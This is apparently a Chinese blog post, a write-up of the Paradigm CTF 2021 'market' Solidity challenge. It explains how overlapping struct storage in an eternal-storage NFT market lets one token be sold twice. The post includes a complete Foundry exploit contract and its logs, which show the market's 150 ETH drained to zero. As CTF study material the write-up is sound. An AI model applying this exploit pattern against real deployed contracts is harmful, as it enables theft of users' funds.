@@ -1,0 +1,705 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="LEVI_104" />
+  <meta name="description" content="始生有物，其形必丑" />
+  
+  
+  <title>
+    
+      09.market 
+      
+      
+      |
+    
+     Sec Life
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="https://s1.vika.cn/space/2022/11/28/de7a2d4fa7ec48ef997fad1fb8af2fe0">
+    <link rel="icon" href="https://moe.photo/images/2023/06/29/d1b2faa44e90a63bb67cc7e990947a2.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="https://moe.photo/images/2023/06/29/d1b2faa44e90a63bb67cc7e990947a2.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">LEVI_104</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">09.market</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2023-08-15 20:39:24
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/19-Paradigm-CTF-2021/" title="19.Paradigm CTF 2021">
+                    <b>#</b> 19.Paradigm CTF 2021
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="market"><a href="#market" class="headerlink" title="market"></a>market</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-全局观"><a href="#1-全局观" class="headerlink" title="1.全局观"></a>1.全局观</h3><p>存储、业务逻辑、市场相分离，形成三个合约</p>
+<ul>
+<li>EternalStorage.sol：存储合约，任何调用都需要在fallback中执行。有owner机制</li>
+<li>Market.sol<ul>
+<li>CryptoCollectibles：业务逻辑合约，有owner机制，mint、转让、授权代币功能</li>
+<li>CryptoCollectiblesMarket：市场合约，token的持有者可以在此合约买卖token，但是需要支付手续费。mint代币的钱、手续费都是放在市场合约，存储合约、业务逻辑合约都负责收钱。任何人都可以mint代币，并且卖出去的时候又收回钱，也就是说成本只有一点手续费而已。</li>
+</ul>
+</li>
+<li>Setup：初始化题目</li>
+</ul>
+<h3 id="2-任务"><a href="#2-任务" class="headerlink" title="2.任务"></a>2.任务</h3><p>将市场合约的余额为0</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function isSolved() external view returns (bool) &#123;</span><br><span class="line">        return address(market).balance == 0;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<h3 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3.详细分析"></a>3.详细分析</h3><p>先来看资产和状态情况：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th></th>
+<th>ETH</th>
+<th>持币</th>
+<th>授权</th>
+<th>状态</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Setup</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>市场合约</td>
+<td>50</td>
+<td></td>
+<td></td>
+<td>owner=Setup</td>
+</tr>
+<tr>
+<td>业务逻辑合约</td>
+<td></td>
+<td></td>
+<td></td>
+<td>owner=Setup, minter[Setup,市场]</td>
+</tr>
+<tr>
+<td>存储合约</td>
+<td></td>
+<td></td>
+<td></td>
+<td>owner=业务逻辑</td>
+</tr>
+<tr>
+<td>随机地址1</td>
+<td></td>
+<td>0: ~5 ether</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>随机地址2</td>
+<td></td>
+<td>0: ~10 ether</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>随机地址3</td>
+<td></td>
+<td>0: ~15 ether</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>随机地址4</td>
+<td></td>
+<td>0: ~20 ether</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>如果能拿到四个随机地址的私钥，就可以卖出了，但是这行不通，并且市场合约中还残留了一些手续费。因此大方向应该是：清理合约的代币价值、清理合约手续费。</p>
+<ul>
+<li><p>存储合约的owner拥有最高权限，可以操作任何人的token，如果拿到这个权限则本题可迎刃而解。</p>
+<ul>
+<li>存储合约的owner是业务逻辑合约，但是他没有转让的逻辑，并且方法是写死的，因此没有方法可以让逻辑合约调用存储合约的转让所有权方法。同时也没有修改slot的方法。不可行。</li>
+<li>既然没办法让逻辑合约主动调用转让方法，那修改存储合约的owner只能靠修改slot了。我们发现存储合约的<code>updateName(bytes32,bytes32)</code>可以修改slot的内容（前提得你是一个token的所有者），但位置我们无法控制，其他方法也是类似。不可行。</li>
+<li>因此修改slot数据这条路也走不通。</li>
+</ul>
+</li>
+<li><p>逻辑合约似乎写的无懈可击</p>
+</li>
+<li><p>钱是存储在市场合约的，看看能不能直接拿走，也许买卖逻辑写的有问题</p>
+<ol>
+<li><p>有很多题目的考点都是出在卖出这个方法，因为写得不严谨，导致可以卖多次或者可以凭空卖出。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function sellCollectible(bytes32 tokenId) public payable &#123;</span><br><span class="line">    require(tokenPrices[tokenId] &gt; 0, &quot;sellCollectible/not-listed&quot;);</span><br><span class="line">    </span><br><span class="line">    (, address tokenOwner, address approved, ) = cryptoCollectibles.getTokenInfo(tokenId);</span><br><span class="line">    require(msg.sender == tokenOwner, &quot;sellCollectible/not-owner&quot;);</span><br><span class="line">    // 卖之前需要approve给此合约</span><br><span class="line">    require(approved == address(this), &quot;sellCollectible/not-approved&quot;);</span><br><span class="line">    </span><br><span class="line">    cryptoCollectibles.transferFrom(tokenId, msg.sender, address(this));</span><br><span class="line">    </span><br><span class="line">    // 然后此合约转钱</span><br><span class="line">    msg.sender.transfer(tokenPrices[tokenId]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>从这个方法中我们可以发现，先查看这个代币是不是被挖出来过，如果是则用<code>getTokenInfo()</code>去到存储合约查看该token的信息，经过验证之后就转钱。这就涉及到了storage布局的问题了，如果我们修改storage就可以做了，但是从上面的分析可以知道我们无法直接凭空修改storage信息。</p>
+</li>
+<li><p>但是还有一种考点就是让两个结构体之间的storage分布重叠，这样也可以达到修改storage的目的。这道题的结构体有四个属性，并且token的所有者可以任意修改这四个属性。这就有操作空间了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct TokenInfo &#123;</span><br><span class="line">    bytes32 displayName;</span><br><span class="line">    address owner;</span><br><span class="line">    address approved;</span><br><span class="line">    address metadata;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>那么，如果我们mint一个自己的token，这样我们就可以操作storage了，但是怎么操作呢？两条路：</p>
+<ul>
+<li>多次卖出自己的token</li>
+<li>修改整个EVM的storage</li>
+</ul>
+</li>
+<li><p>由于我们的tokenId是随机的不可控，因此很说想修改哪个storage的内容就修改哪个，因此我们只能看看能不能多次卖出自己的token。我们可以修改自己的这四个属性的storage，范围属实很小。再次分析<code>sellCollectible()</code>看看有没有什么操作空间。</p>
+</li>
+<li><p>我们发现<code>require(tokenPrices[tokenId] &gt; 0, &quot;sellCollectible/not-listed&quot;);</code>仅仅检查是不是被挖过，然后就检查存储合约的storage布局。当我们修改了我们的token的四个属性之后，用另外一个没有mint过的tokenId直接去调用存储合约的方法，利用结构体重叠的方式，使得这个没有被mint过的token也变得有效，然后重复操作重叠的内容，使得原来我们有效的token可以重复卖出</p>
+</li>
+</ol>
+</li>
+</ul>
+<p>从存储合约的逻辑中，我们可以看出，它是根据tokenId后面之后的内容判断一个token的所有者是谁，如果重叠了了之后，就可以修改一个token的所有者。我们将如下这么重叠，通过修改tokenId_0的approval和metadata属性会修改tokenId_1的所有者属性。</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>mint过有效的tokenId_0</th>
+<th>未mint的tokenId_1</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>tokenId_0.name</td>
+<td></td>
+</tr>
+<tr>
+<td>tokenId_0.owner</td>
+<td></td>
+</tr>
+<tr>
+<td>tokenId_0.approval</td>
+<td>tokenId_1.name</td>
+</tr>
+<tr>
+<td>tokenId_0.metadata</td>
+<td>tokenId_1.owner</td>
+</tr>
+<tr>
+<td></td>
+<td>tokenId_1.approval</td>
+</tr>
+<tr>
+<td></td>
+<td>tokenId_1.metadata</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>因此，我们有了具体的解决思路：</p>
+<ol>
+<li>mint一个有效的token，然后修改此token的四个属性</li>
+<li>直接与存储合约交互，由于结构体重叠，使得原本没被mint过的token也有效</li>
+<li>重复操作重叠部分的内容，使得我们可以重复卖出原本有效的token</li>
+<li>因为有手续费的原因，我们需要额外的操作来处理残留的手续费</li>
+</ol>
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity 0.7.0;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../../src/09.market/Setup.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract attackTest is Test &#123;</span><br><span class="line">    Setup public level;</span><br><span class="line"></span><br><span class="line">    EternalStorageAPI public eternalStorage; // 存储</span><br><span class="line">    CryptoCollectibles public token; // 业务逻辑</span><br><span class="line">    CryptoCollectiblesMarket public market; // 市场</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        // 部署</span><br><span class="line">        payable(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4).transfer(100 ether);</span><br><span class="line">        vm.startBroadcast(address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4));</span><br><span class="line"></span><br><span class="line">        level = new Setup&#123;value: 50 ether&#125;();</span><br><span class="line">        eternalStorage = level.eternalStorage();</span><br><span class="line">        token = level.token();</span><br><span class="line">        market = level.market();</span><br><span class="line"></span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_isComplete() public&#123;</span><br><span class="line">        console.log(&quot;1.market init balance:&quot;,address(market).balance);</span><br><span class="line">        // 1.mint token0, 至少要稍微大于50ETH，因为后面要额外扣除原来50ETH剩下的手续费</span><br><span class="line">        /*</span><br><span class="line">            tokenId_0.name:token_0</span><br><span class="line">            tokenId_0.owner:address(this)</span><br><span class="line">            tokenId_0.approval:0                    tokenId_1.name</span><br><span class="line">            tokenId_0.metadata:0                    tokenId_1.owner</span><br><span class="line">                                                    tokenId_1.approval</span><br><span class="line">                                                    tokenId_1.metadata</span><br><span class="line">         */</span><br><span class="line">        // market: 100ETH + 50ETH</span><br><span class="line">        bytes32 token_0 = market.mintCollectibleFor&#123;value: 100 ether&#125;(address(this));</span><br><span class="line">        console.log(&quot;2.market mint token0:&quot;,address(market).balance);</span><br><span class="line"></span><br><span class="line">        // 2.修改token_0.metadata, 让它等于address(this)</span><br><span class="line">        /*</span><br><span class="line">            tokenId_0.name:token_0</span><br><span class="line">            tokenId_0.owner:address(this)</span><br><span class="line">            tokenId_0.approval:0                    tokenId_1.name</span><br><span class="line">            tokenId_0.metadata:address(this)        tokenId_1.owner</span><br><span class="line">                                                    tokenId_1.approval</span><br><span class="line">                                                    tokenId_1.metadata</span><br><span class="line">         */</span><br><span class="line">        // market: 100ETH + 50ETH</span><br><span class="line">        eternalStorage.updateMetadata(token_0, address(this));</span><br><span class="line"></span><br><span class="line">        // 3.approve token</span><br><span class="line">        /*</span><br><span class="line">            tokenId_0.name:token_0</span><br><span class="line">            tokenId_0.owner:address(this)</span><br><span class="line">            tokenId_0.approval:market               tokenId_1.name</span><br><span class="line">            tokenId_0.metadata:address(this)        tokenId_1.owner</span><br><span class="line">                                                    tokenId_1.approval</span><br><span class="line">                                                    tokenId_1.metadata</span><br><span class="line">         */</span><br><span class="line">        // market: 100ETH + 50ETH</span><br><span class="line">        token.approve(token_0, address(market));</span><br><span class="line"></span><br><span class="line">        // 4.卖出该token_0, tokenId为token_0</span><br><span class="line">        /*</span><br><span class="line">            tokenId_0.name:token_0</span><br><span class="line">            tokenId_0.owner:market</span><br><span class="line">            tokenId_0.approval:0                    tokenId_1.name</span><br><span class="line">            tokenId_0.metadata:address(this)        tokenId_1.owner</span><br><span class="line">                                                    tokenId_1.approval</span><br><span class="line">                                                    tokenId_1.metadata</span><br><span class="line">         */</span><br><span class="line">        // market: 100ETH&#x27;s fee + 50ETH</span><br><span class="line">        console.log(&quot;3.market sell token0:&quot;,address(market).balance);</span><br><span class="line">        market.sellCollectible(token_0);</span><br><span class="line"></span><br><span class="line">        // 5.get token_1</span><br><span class="line">        /*</span><br><span class="line">            tokenId_0.name:token_0</span><br><span class="line">            tokenId_0.owner:market</span><br><span class="line">            tokenId_0.approval:0                    tokenId_1.name</span><br><span class="line">            tokenId_0.metadata:address(this)        tokenId_1.owner</span><br><span class="line">                                                    tokenId_1.approval</span><br><span class="line">                                                    tokenId_1.metadata</span><br><span class="line">         */</span><br><span class="line">        // market: 100ETH&#x27;s fee + 50ETH</span><br><span class="line">        bytes32 token_1 = bytes32(uint256(token_0)+2);</span><br><span class="line"></span><br><span class="line">        // 6.updateName-&gt;approval</span><br><span class="line">        /*</span><br><span class="line">            tokenId_0.name:token_0</span><br><span class="line">            tokenId_0.owner:market</span><br><span class="line">            tokenId_0.approval:0                    tokenId_1.name:address(this)</span><br><span class="line">            tokenId_0.metadata:address(this)        tokenId_1.owner</span><br><span class="line">                                                    tokenId_1.approval</span><br><span class="line">                                                    tokenId_1.metadata</span><br><span class="line">         */</span><br><span class="line">        // 注意，这里tokenId_1是address，因此可以直接调用存储合约的更新名字方法</span><br><span class="line">        // market: 100ETH&#x27;s fee + 50ETH</span><br><span class="line">        eternalStorage.updateName(token_1, bytes32(uint256(address(this))));</span><br><span class="line"></span><br><span class="line">        // 7.transferFrom</span><br><span class="line">        /*</span><br><span class="line">            tokenId_0.name:token_0</span><br><span class="line">            tokenId_0.owner:address(this)</span><br><span class="line">            tokenId_0.approval:0                    tokenId_1.name:address(this)</span><br><span class="line">            tokenId_0.metadata:address(this)        tokenId_1.owner</span><br><span class="line">                                                    tokenId_1.approval</span><br><span class="line">                                                    tokenId_1.metadata</span><br><span class="line">         */</span><br><span class="line">        // 注意，tokenId_0的approval被重新赋值为address(this)，因此我们有权转移</span><br><span class="line">        // market: 100ETH&#x27;s fee + 50ETH</span><br><span class="line">        token.transferFrom(token_0, address(market), address(this));</span><br><span class="line"></span><br><span class="line">        // 8.将token_0再次卖出</span><br><span class="line">        /*</span><br><span class="line">            tokenId_0.name:token_0</span><br><span class="line">            tokenId_0.owner:address(this)</span><br><span class="line">            tokenId_0.approval:market               tokenId_1.name:market</span><br><span class="line">            tokenId_0.metadata:address(this)        tokenId_1.owner</span><br><span class="line">                                                    tokenId_1.approval</span><br><span class="line">                                                    tokenId_1.metadata</span><br><span class="line">         */</span><br><span class="line">        // market: 100ETH&#x27;s fee + 50ETH</span><br><span class="line">        token.approve(token_0, address(market));</span><br><span class="line"></span><br><span class="line">        // 计算：token0的价格</span><br><span class="line">        uint tokenPrice = uint256(100 ether) * 10000 / (10000 + 1000);</span><br><span class="line">        // 缺失的钱 = token0的价格 - market剩余的金额</span><br><span class="line">        // 为什么要算这个呢？因为我们可以再次取出token0，得到token0的价格，</span><br><span class="line">        // 但是market中并没有这么多余额，会报错，因此我们需要再次mint来存入一点钱，</span><br><span class="line">        // 使得market的余额刚好等于token0的价格，这样我们再次取出token0的时候，</span><br><span class="line">        // market就刚好没钱了</span><br><span class="line">        uint missingBalance = tokenPrice - address(market).balance;</span><br><span class="line"></span><br><span class="line">        //补偿缺少的ETH</span><br><span class="line">        /*</span><br><span class="line">            tokenId_0.name:token_0</span><br><span class="line">            tokenId_0.owner:address(this)</span><br><span class="line">            tokenId_0.approval:market               tokenId_1.name:market</span><br><span class="line">            tokenId_0.metadata:address(this)        tokenId_1.owner</span><br><span class="line">                                                    tokenId_1.approval</span><br><span class="line">                                                    tokenId_1.metadata</span><br><span class="line">         */</span><br><span class="line">        // market: 100ETH&#x27;s fee + 50ETH + missingBalance = token0&#x27;s price</span><br><span class="line">        market.mintCollectible&#123;value:missingBalance&#125;();</span><br><span class="line">        console.log(&quot;4.market mint another token:&quot;,address(market).balance);</span><br><span class="line">        // sellAgain</span><br><span class="line">        /*</span><br><span class="line">            tokenId_0.name:token_0</span><br><span class="line">            tokenId_0.owner:address(this)</span><br><span class="line">            tokenId_0.approval:market               tokenId_1.name:market</span><br><span class="line">            tokenId_0.metadata:address(this)        tokenId_1.owner</span><br><span class="line">                                                    tokenId_1.approval</span><br><span class="line">                                                    tokenId_1.metadata</span><br><span class="line">         */</span><br><span class="line">        // market: 0ETH</span><br><span class="line">        market.sellCollectible(token_0);</span><br><span class="line">        console.log(&quot;5.market after attack:&quot;,address(market).balance);</span><br><span class="line"></span><br><span class="line">        assertEq(level.isSolved(), true);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable&#123;&#125; // 用于接收ETH</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Logs:</span><br><span class="line">  1.market init balance: 50000000000000000000</span><br><span class="line">  2.market mint token0: 150000000000000000000</span><br><span class="line">  3.market sell token0: 150000000000000000000</span><br><span class="line">  4.market mint another token: 90909090909090909090</span><br><span class="line">  5.market after attack: 0</span><br></pre></td></tr></table></figure>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/08/14/19.Paradigm%20CTF%202021/08.yieldAggregator/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2023-08-15 20:39:24
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/19-Paradigm-CTF-2021/" title="19.Paradigm CTF 2021">
+                        <b>#</b> 19.Paradigm CTF 2021
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2023/08/16/19.Paradigm%20CTF%202021/10.lockbox/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#market"><span class="toc-text">market</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%85%A8%E5%B1%80%E8%A7%82"><span class="toc-text">1.全局观</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BB%BB%E5%8A%A1"><span class="toc-text">2.任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90"><span class="toc-text">3.详细分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-text">解题</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" target="_blank" rel="noopener" href="https://s1.vika.cn/space/2022/11/28/f39f02b157524b31805619f093b4b3c8">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" target="_blank" rel="noopener" href="https://s1.vika.cn/space/2022/11/27/6bf8f7df3643480a9d216473a3caf2d0">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
